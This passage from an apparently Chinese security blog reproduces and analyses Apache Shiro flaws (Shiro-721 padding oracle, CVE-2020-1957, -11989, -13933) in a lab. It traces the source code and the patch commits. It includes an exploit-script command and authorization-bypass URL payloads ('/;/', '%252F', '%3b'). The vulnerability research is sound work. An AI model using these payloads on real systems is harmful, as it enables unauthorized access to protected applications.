</tbody></table>
<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境用的是这位师傅的 <a href="https://github.com/inspiringz/Shiro-721/tree/master/Docker%EF%BC%8C%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E8%AE%BF%E9%97%AE%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/inspiringz/Shiro-721/tree/master/Docker，搭建好后访问得到如下：</a></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281042179.png" alt="image-20220928104258960"></p>
<p>勾选rememberMe，登录获取rememberMe的cookie value</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rememberMe=UHO2xoJqYLimSdPUt+qvPuJc2MqyYr1MOHj20pCIpD9WYs9oc8oOvHo9DdfjY/2fNv5mB34OIgamHYByPj75f7ixcrame6ad5/F5sfKJ+7+r3qj5l0SSJMK4S9PpHHzHY4heNG1oOvcqQSekm4msr3W6YoYNPP0THVbf7u0Yt3vzMzgxJzAqbCFRDXyY6L+ryFRfyE0jjPvfHyk9G2EbZBLsvEHlUPr9AZ+GWP+VkB2mUYF8yk2QSPOzVYr0NmYOAjGIY5IJhcn7lW5USNmWuXDLF/lkJvvjzR7cKA6NvG+4u0mEbHfETPFijiwsRjEwxlORwOmMnR5SkH1MWFRspijIk4WRSFPQnexQTq+Y4uuLDU9N69UrfhlFAGI3rRni42OpEzvkyHd+k7+jHvIL0haGdxRsyXLSO3rjLVLnRaNxyuUpVya4s2iENx5/fpOqigJcYxi3l5QLMe2vAtHxNrlKMuM+Al3BYEhI/ep06zWyAiv3XrmCrIlDV5NcH3Sa</span><br></pre></td></tr></table></figure>

<p>使用ysoserial生成payload</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281046701.png" alt="image-20220928104630508"></p>
<p>利用脚本还是这位师傅的：<a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python2 .\shiro_exp.py &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">12</span>.<span class="number">130</span>:<span class="number">8080</span>/myshiro/&quot; &quot;UHO2xoJqYLimSdPUt+qvPuJc2MqyYr1MOHj20pCIpD9WYs9oc8oOvHo9DdfjY/<span class="number">2</span>fNv5mB34OIgamHYByPj75f7ixcrame6ad5/F5sfKJ+<span class="number">7</span>+r3qj5l0SSJMK4S9PpHHzHY4heNG1oOvcqQSekm4msr3W6YoYNPP0THVbf7u0Yt3vzMzgxJzAqbCFRDXyY6L+ryFRfyE0jjPvfHyk9G2EbZBLsvEHlUPr9AZ+GWP+VkB2mUYF8yk2QSPOzVYr0NmYOAjGIY5IJhcn7lW5USNmWuXDLF/lkJvvjzR7cKA6NvG+<span class="number">4</span>u0mEbHfETPFijiwsRjEwxlORwOmMnR5SkH1MWFRspijIk4WRSFPQnexQTq+Y4uuLDU9N69UrfhlFAGI3rRni42OpEzvkyHd+k7+jHvIL0haGdxRsyXLSO3rjLVLnRaNxyuUpVya4s2iENx5/fpOqigJcYxi3l5QLMe2vAtHxNrlKMuM+Al3BYEhI/ep06zWyAiv3XrmCrIlDV5NcH3Sa&quot; .\payload.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281125034.png" alt="image-20220928112434246"></p>
<p>最后得到可利用的RememberMe Cookie，发送数据包即可，这里因为电脑比较卡，就没有跑出来。</p>
<h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这块的漏洞原理和CVE-2016-6802讲的shiro key探测类似，都是通过异常走进catch代码块中的<code>onRememberedPrincipalFailure</code>方法，导致响应包出现deleteMe的字段，根据回显的不同来进行探测的</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281148247.png" alt="image-20220928114808156"></p>
<p>先进入<code>convertBytesToPrincipals</code>方法中看下哪个点会触发异常，这里有个<code>getCipherService</code>方法不会导致异常的发生，那就看下<code>decrypt</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281151926.png" alt="image-20220928115132872"></p>
<p>跟进<code>decrypt</code>方法，调用<code>arraycopy</code>方法将原密文复制到<code>encrypted</code>数组中，并传入<code>JcaCipherService#decrypt</code>一个重载方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281303031.png" alt="image-20220928130345936"></p>
<p>继续一直调用decrypt重载方法，最后来到这个重载方法，调用<code>Cipher#doFinal</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281311387.png" alt="image-20220928131119321"></p>
<p>来到<code>AESCipher#engineDoFinal</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281312573.png" alt="image-20220928131235460"></p>
<p>继续向下通过<code>CipherCore#unpad</code>方法检测是否padding正确，否则抛出异常</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281318489.png" alt="image-20220928131843275"></p>
<p><code>unpad</code>方法的检测逻辑</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281320223.png" alt="image-20220928132008112"></p>
<p>所以，如果padding正确，那么就会返回正常的数据包，如果padding异常就会被最开始的<code>AbstractRememberMeManager#getRememberedPrincipals</code>方法捕获，进入<code>AbstractRememberMeManager#onRememberedPrincipalFailure</code>方法中，后面在响应包中回显deleteMe在检测key时就说明过了，不在向下分析。</p>
<p>有关RememberMe Padding Oracle更多的细节可以看：<a href="https://xz.aliyun.com/t/9406">https://xz.aliyun.com/t/9406</a></p>
<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在 1.4.2 版本的更新 <a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a> 中针对此漏洞进行了修复，在AesCipherService中重写了<code>createParameterSpec</code>方法，设置默认使用 GCM 加密模式</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281328963.png" alt="image-20220928132853662"></p>
<h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><h4 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-1957</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">CNVD-2020-20984</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.5.3</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Spring Boot 中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL 利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">SpringBoot | 差异化处理 | &#x2F; | 绕过</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> &amp;&amp; <a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a> &amp;&amp; <a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://issues.apache.org/jira/browse/SHIRO-742">SHIRO-742</a> <a href="https://www.openwall.com/lists/oss-security/2020/03/23/2">https://www.openwall.com/lists/oss-security/2020/03/23/2</a> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2957">CVE-2020-2957</a> -&gt; ?</td>
</tr>
</tbody></table>
<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>漏洞起源于 <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a>，根据描述信息大致可以知道，在shiro和spring结合使用时，spring请求的 <code>/resource/meuns</code> 和 <code>/resource/menus/</code> 都能够访问到资源，但是在shiro的pathPattern匹配时，会匹配上 <code>/resource/meuns</code> ，但不能匹配 <code>/resource/menus/</code>，因此可以使用reuestURI + “&#x2F;“ 去绕过filter chain，绕过shiro的权限校验。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281414058.png" alt="image-20220928141454818"></p>
<p>下面简单搭建一个springboot+shiro的环境，shiro的版本用的是&lt;&#x3D;1.5.1即可，ShiroConfig配置好需要鉴权的路径</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281419815.png" alt="image-20220928141917697"></p>
<p>然后访问需要权限的 <code>/admin/index</code> 接口，如下显示302需要登录</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281421742.png" alt="image-20220928142111557"></p>
<p>这时根据漏洞的描述，访问 <code>/admin/index/</code>，成功绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281422762.png" alt="image-20220928142225627"></p>
<p>习惯性的用字典跑一下，还是可以采用 “;”进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/;/myshiro/admin/index </span><br><span class="line">/%3b/../myshiro/admin/index</span><br><span class="line">/img/..;/myshiro/admin/index</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281444040.png" alt="image-20220928144402921"></p>
<h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>spring 在分发请求时，会调用<code>PathPatternsRequestCondition#getMatchingPatterns</code>获取匹配的路径，调用的是<code>PathPattern.mathches</code>进行匹配，从结果来看spring认为 <code>/admin/index</code> 和 <code>/admin/index/</code> 一样</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281545777.png" alt="image-20220928154502666"></p>
<p>而shiro的路径匹配采用的是<code>org.apache.shiro.util.PatternMatcher#matches</code>，返回<code>false</code>，就导致了shiro的权限绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281549411.png" alt="image-20220928154953327"></p>
<p>在上面漏洞复现的时候，我会习惯性地用字典跑一个权限绕过的payload，大家应该发现每次跑的时候都存在一个 <code>&quot;;&quot;</code> 绕过的方式，而这个方式就是对上面的一种绕过，修改下环境的shiro版本，上面环境用的是shiro1.4.2，现在改用shiro1.5.2（该版本已经修复了上面采用 “&#x2F;“ 进行全绕过的漏洞），在pom.xml中修改为如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.5.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>此时，再去测试时就会发现 <code>&quot;/&quot;</code> 这种方式已经失效了</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281556036.png" alt="image-20220928155626915"></p>
<p>试试之前经常用的 <code>&quot;;&quot;</code> ，可以发现依旧能够绕过权限校验</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281558724.png" alt="image-20220928155800583"></p>
<p>注：该绕过方式在shiro1.5.3终于修复，下面是shiro1.5.3的环境</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281559105.png" alt="image-20220928155943938"></p>
<p>那么，我们就要研究下在shiro&lt;&#x3D;1.5.2中，<code>&quot;;&quot;</code> 绕过的原理是什么，以及在shiro1.5.3中又是如何修复的呢，下面开始分析。</p>
<p>还是从<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>方法开始分析</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281624188.png" alt="image-20220928162410071"></p>
<p>这里看到获取的contextPath的值是 <code>&quot;/;/shiro&quot;</code>， 根据经验，只要requestUri不是以contextPath开头那都可能存在问题提，所以这次可能也不例外</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281627035.png" alt="image-20220928162756918"></p>
<p>进入<code>org.apache.shiro.web.util.WebUtils#getRequestUri</code>，发现在处理uri时会调用<code>WebUtils#decodeAndCleanUriString</code>进行处理</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281630420.png" alt="image-20220928163058300"></p>
<p>跟进<code>WebUtils#decodeAndCleanUriString</code>，可以发现，这里会检查uri中是否包含有 <code>&quot;;&quot;</code>，如果有，就以第一个 <code>&quot;;&quot;</code>为下标进行字符串截取，如下截取完之后就会返回 <code>&quot;/&quot;</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281633700.png" alt="image-20220928163306583"></p>
<p>所以，requestUri返回 <code>&quot;/&quot;</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281635734.png" alt="image-20220928163506624"></p>
<p>而后，在进行路径匹配时，那就是<code>false</code>了，shiro这层就绕过了</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281637720.png" alt="image-20220928163703620"></p>
<p>那spring有是如何处理requestUri，它会对 <code>&quot;;&quot;</code> 做什么处理？</p>
<p>spring处理的时候会调用<code>org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString</code>方法处理uri，如下，包含有三个方法，每一个方法都对uri进行了相应的处理</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281641614.png" alt="image-20220928164110510"></p>
<p>首先，跟进<code>UrlPathHelper#removeSemicolonContent</code>方法，发现循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，也就是说 <code>&quot;/;aa/bbb&quot;</code>会转化成 <code>&quot;/bbb&quot;</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281700921.png" alt="image-20220928170023801"></p>
<p>返回，进入第二个<code>decodeRequestString</code>方法，发现会根据对应的编码进行解码操作，否则进行url解码</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281707395.png" alt="image-20220928170702289"></p>
<p>进入第三个<code>getSanitizedPath</code>方法，可以看到就是将 <code>&quot;//&quot;</code> 转成 <code>&quot;/&quot;</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281708240.png" alt="image-20220928170850153"></p>
<p>所以，我们的uri：<code>/;a/myshiro/admin/index</code>经过这三个函数转化后变成 <code>/myshiro/admin/index</code></p>
<h4 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>对于采用 “&#x2F;“的形式绕过，在<a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> 和<a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>中得到了修复，如果requestURI以 “&#x2F;“结尾就去除 </p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281718892.png" alt="image-20220928171802652"></p>
<p>第二次提交是<a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>，对path与 “&#x2F;“ 做了个判断</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281722499.png" alt="image-20220928172255334"></p>
<p>对使用 <code>&quot;;&quot;</code> 绕过的修复在 <a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281725846.png" alt="image-20220928172526683"></p>
<p>获取requestURI的方式发生了改变，改成如下方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">uri = request.getContextPath() + <span class="string">&quot;/&quot;</span> + request.getServletPath() + request.getPathInfo();</span><br></pre></td></tr></table></figure>

<p>说明下这几个方法的区别：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">假设访问url为：http://127.0.0.1:8080/myshiro/admin/index</span><br><span class="line">request.getContextPath()：返回上下文路径（也就是工程名）</span><br><span class="line">    - 返回的就是/myshiro，如果工程名为空，那返回的也是空</span><br><span class="line">request.getServletPath()：返回除去host和工程名部分的路径</span><br><span class="line">    - 当访问servlet时：返回就是/admin/index</span><br><span class="line">    - 当访问resource目录下的login.jsp时：返回的就是/resource/login.jsp</span><br><span class="line">request.getRequestURI()：返回除去host（域名或者ip）部分的路径</span><br><span class="line">    - 当访问servlet时：/myshiro/admin/index</span><br><span class="line">    - 当访问resource目录下的login.jsp时：返回的就是/resource/login.jsp</span><br><span class="line">request.getRequestURL()：返回的整个URL的路径请求</span><br><span class="line">    - 返回的就是http://127.0.0.1:8080/myshiro/admin/index</span><br><span class="line">request.getRealPath()：返回的文件所在的绝对路径，相对于当前计算机的真实路径</span><br><span class="line">request.getPathInfo()：返回请求的实际URL相对于请求的serlvet的url的路径。</span><br><span class="line">	- 当servlet配置为(url-pattern=/admin/index/*)时，访问http://127.0.0.1:8080/myshiro/admin/index/a/b.html，则返回的就是/a/b.html</span><br><span class="line">request.getScheme()：返回的是使用的协议(http 或https)</span><br><span class="line">request.getProtocol()：获取的是协议的名称(HTTP/1.11)</span><br><span class="line">request.getServerName()：获取的是域名</span><br><span class="line">request.getLocalName()：获取到的是IP</span><br><span class="line"></span><br><span class="line">假设访问url为：http://localhost/hehehe  （无工程名）</span><br><span class="line">getContextPath:</span><br><span class="line">getServletPath：/hehehe</span><br><span class="line">getRequestURI():/hehehe</span><br><span class="line">getRequestURL()：http://localhost/hehehe</span><br><span class="line">getRealPath()：E:\java\myshiro\out\artifacts\myshiro_Web_exploded\</span><br><span class="line">getPathInfo()：null</span><br></pre></td></tr></table></figure>

<p>但其实在这里测试使用 <code>&quot;;&quot;</code> 还是可以绕过，因为在<code>request.getContextPath</code>方法处理的结果还是包含 <code>&quot;;&quot;</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282149475.png" alt="image-20220928214909319"></p>
<p>真正的修复在 shiro1.5.3中，直接采用<code>getServletPath(request) + getPathInfo(request)</code>获取requestURI，然后返回和PathPattern比对。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290010452.png" alt="image-20220929001014321"></p>
<p>再次用<code>/;/admin/index</code>测试得到如下：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290005346.png" alt="image-20220929000516277"></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282158361.png" alt="image-20220928215845274"></p>
<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><h4 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-782">SHIRO-782</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.5.3</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">Spring | 双重编码 | %25%32%66 | 绕过 | context-path | &#x2F;;&#x2F;</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a> <a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>之前我们在配置路径表达式的时候都是配置成<code>/admin/**</code>这种形式，这种风格叫Ant风格，ANT 通配符有 3 种</p>
<table>
<thead>
<tr>
<th align="center">通配符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">?</td>
<td align="center">匹配任何单字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配0或者任意数量的字符</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">匹配0或者更多的目录</td>
</tr>
</tbody></table>
<p>当配置成 <code>/admin/*</code>时，我们访问 &#x2F;admin&#x2F;a会被拦截，但是访问 &#x2F;admin&#x2F;a&#x2F;b则不会，本次漏洞的触发原因之一就是当配置路径表达式中使用了 <code>&quot;*&quot;</code>， 下面我们搭建环境复现。</p>
<p>环境有点小变化，ShiroConfig配置成如下形式 <code>/admin/*</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281816940.png" alt="image-20220928181605844"></p>
<p>修改controller的路径访问，配置成restful风格的请求方式：<code>@PostMapping(value = &quot;/&#123;name&#125;&quot;)</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281821233.png" alt="image-20220928182139175"></p>
<p>当访问<code>/admin/*</code>下的资源时，被拦截</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281823577.png" alt="image-20220928182341408"></p>
<p>当访问<code>/admin/index%252Fxxxxxx</code>是时，权限被绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281824386.png" alt="image-20220928182424218"></p>
<h4 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在分析漏洞前，先了解下tomcat URL解析的差异，在CVE-2020-1957的结尾我们了解了<code>HTTPServletRequest</code>的几个解析URL的函数，现在回顾一遍</p>
<blockquote>
<p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>URL解码</th>
<th>解析结构</th>
</tr>
</thead>
<tbody><tr>
<td>getRequestURL()</td>
<td>no</td>
<td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
</tr>
<tr>
<td>getRequestURI()</td>
<td>no</td>
<td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
</tr>
<tr>
<td>getContextPath()</td>
<td>no</td>
<td><code>/app</code></td>
</tr>
<tr>
<td>getServletPath()</td>
<td>yes</td>
<td><code>/test?</code></td>
</tr>
<tr>
<td>getPathInfo()</td>
<td>yes</td>
<td><code>/a?+b</code></td>
</tr>
</tbody></table>
<p>结论的具体分析细节可以看这篇文章：<a href="https://xz.aliyun.com/t/7544%EF%BC%9B%E8%B4%B4%E5%87%BA%E4%B8%8A%E9%9D%A2%E7%BB%93%E8%AE%BA%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%B0%B1%E6%98%AF%E8%BF%99%E6%AC%A1%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E4%B9%8B%E4%B8%80%E5%B0%B1%E6%9D%A5%E8%87%AA%E4%BA%8E%E4%B8%8A%E9%9D%A2%E5%88%97%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90%E5%87%BD%E6%95%B0%E5%AF%B9URL%E8%A7%A3%E7%A0%81%E7%9A%84%E7%89%B9%E6%80%A7%EF%BC%8C%E6%97%A2%E7%84%B6tomcat%E5%AF%B9url%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%8C%E9%82%A3shiro%E7%9A%84%E5%A4%84%E7%90%86%E4%BC%9A%E6%9C%89%E6%89%80%E5%B7%AE%E5%BC%82%E4%B9%88%EF%BC%9F%E6%88%91%E4%BB%AC%E6%9D%A5%E5%88%86%E6%9E%90%E7%9C%8B%E7%9C%8B%E3%80%82">https://xz.aliyun.com/t/7544；贴出上面结论的原因就是这次的漏洞的成因之一就来自于上面列出的解析函数对URL解码的特性，既然tomcat对url的处理方式是这样的，那shiro的处理会有所差异么？我们来分析看看。</a></p>
<p>本次漏洞环境还是用的shiro1.5.2的，请求<code>/myshiro/admin/index%252Faa</code>，调式 进入<code>getRequestUri</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282247859.png" alt="image-20220928224714728"></p>
<p>更进，发现调用了<code>request.getServletPath</code>方法进行uri拼接，在上面的函数表格里，<code>getServletPath</code>方法会对url进行一次解码</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282248896.png" alt="image-20220928224824750"></p>
<p>可以看到此时<code>getServletPath</code>返回的值为 <code>/admin/index%2Faa</code>，uri为<code>/myshiro//admin/index%2Faa</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282253956.png" alt="image-20220928225355829"></p>
<p>然后将uri传入<code>decodeAndCleanUriString</code>方法，继续进入<code>decodeRequestString</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282255904.png" alt="image-20220928225500816"></p>
<p>这里会对uri再进行一次解码，原本uri为<code>/myshiro//admin/index%2Faa</code>，解码之后得到<code>/myshiro//admin/index/aa</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282255289.png" alt="image-20220928225554119"></p>
<p>然后返回<code>/admin/index/aa</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282311542.png" alt="image-20220928231154403"></p>
<p>最后匹配不上，导致权限绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282318852.png" alt="image-20220928231825694"></p>
<p>而spring在处理时会把<code>/myshiro/admin/index%252Faa</code>处理成 <code>/admin/index%2Faa</code>，就会被<code>@PostMapping(value = &quot;/&#123;name&#125;&quot;)</code>接收，可能会绕过请求。</p>
<h4 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a> 中针对此漏洞进行了修复，第一处修改，采用<code>getServletPath(request) + getPathInfo(request)</code>获取requestURI</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282357669.png" alt="image-20220928235703523"></p>
<p>第二处修改就是直接用<code>HttpServletRequest.getRequestURI</code>方法获取uri</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282359112.png" alt="image-20220928235916963"></p>
<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><h4 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933">CVE-2020-13933</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-46579">CNVD-2020-46579</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.6.0</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">Spring | 顺序 | %3b | 绕过</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://xz.aliyun.com/t/8223">https://xz.aliyun.com/t/8223</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境采用的是shiro1.5.3，使用CVE-2020-11989的payload发现失效</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290033884.png" alt="image-20220929003343765"></p>
<p>使用 <code>/myshiro/admin/%3baa</code>成功绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290030430.png" alt="image-20220929003023305"></p>
